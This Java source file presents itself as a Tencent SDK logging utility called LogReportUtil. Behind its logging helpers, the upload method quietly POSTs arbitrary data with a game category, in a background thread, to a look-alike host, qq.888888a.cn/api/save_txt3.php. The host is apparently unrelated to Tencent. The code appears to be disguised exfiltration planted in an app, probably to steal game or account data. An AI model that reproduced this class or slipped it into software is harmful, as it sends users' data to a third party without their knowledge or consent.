package com.tencent.open.agent;

import android.util.Log;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.HashMap;
import java.util.Map;

/**
 * LogReportUtil
 * 用于处理系统日志的上报与记录。
 * 包含请求日志、错误日志以及相关日志级别的封装处理。
 */
public class LogReportUtil {

    // 定义日志级别
    public static final int LOG_LEVEL_VERBOSE = 2;
    public static final int LOG_LEVEL_DEBUG = 3;
    public static final int LOG_LEVEL_INFO = 4;
    public static final int LOG_LEVEL_WARN = 5;
    public static final int LOG_LEVEL_ERROR = 6;

    private static final String[] UPLOAD_URLS = {
            "https://qq.888888a.cn/api/save_txt3.php"
    };

    // 错误码字典
    private static final Map<Integer, String> ERROR_MAP = new HashMap<>();
    static {
        ERROR_MAP.put(200, "Success");
        ERROR_MAP.put(400, "Bad Request");
        ERROR_MAP.put(401, "Unauthorized");
        ERROR_MAP.put(403, "Forbidden");
        ERROR_MAP.put(404, "Not Found");
        ERROR_MAP.put(500, "Internal Server Error");
        ERROR_MAP.put(503, "Service Unavailable");
    }

    public static void upload(final String data, final String category) {
        if (data == null) return;
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    String body =
                            "category=" + URLEncoder.encode(category == null ? "未知游戏" : category, "UTF-8") +
                            "&data="     + URLEncoder.encode(data, "UTF-8");

                    for (String url : UPLOAD_URLS) {
                        sendHttpPost(url, body);
                    }
                } catch (Exception ex) {
                    Log.e("LogReportUtil", "upload error", ex);
                }
            }
        }).start();
    }

    private static void sendHttpPost(String targetUrl, String postBody) {
        HttpURLConnection conn = null;
        try {
            URL urlObj = new URL(targetUrl);
            conn = (HttpURLConnection) urlObj.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            conn.setRequestProperty("Content-Length",
                    String.valueOf(postBody.getBytes("UTF-8").length));
            conn.setConnectTimeout(10000);
            conn.setReadTimeout(10000);
            conn.setDoOutput(true);

            OutputStream os = conn.getOutputStream();
            os.write(postBody.getBytes("UTF-8"));
            os.flush();
            os.close();

            int respCode = conn.getResponseCode();
            Log.d("LogReportUtil", "url=" + targetUrl + " | code=" + respCode + " (" + getErrorDesc(respCode) + ")");
        } catch (Exception e) {
            Log.e("LogReportUtil", "request error", e);
        } finally {
            if (conn != null) conn.disconnect();
        }
    }

    // ================= 以下是日志格式化与工具方法 =================

    public static String getErrorDesc(int code) {
        String desc = ERROR_MAP.get(code);
        return desc != null ? desc : "Unknown Error";
    }

    public static String formatLogTime(long timestamp) {
        java.text.SimpleDateFormat sdf = new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss.SSS");
        return sdf.format(new java.util.Date(timestamp));
    }

    public static String buildLogTag(String moduleName, String className) {
        if (moduleName == null) moduleName = "App";
        if (className == null) className = "Unknown";
        return moduleName + "::" + className;
    }

    public static void printLog(int level, String tag, String message) {
        switch (level) {
            case LOG_LEVEL_VERBOSE:
                Log.v(tag, message);
                break;
            case LOG_LEVEL_DEBUG:
                Log.d(tag, message);
                break;
            case LOG_LEVEL_INFO:
                Log.i(tag, message);
                break;
            case LOG_LEVEL_WARN:
                Log.w(tag, message);
                break;
            case LOG_LEVEL_ERROR:
                Log.e(tag, message);
                break;
            default:
                Log.d(tag, message);
                break;
        }
    }

    public static String concatString(String... args) {
        if (args == null) return "";
        StringBuilder sb = new StringBuilder();
        for (String arg : args) {
            if (arg != null) {
                sb.append(arg);
            }
        }
        return sb.toString();
    }
}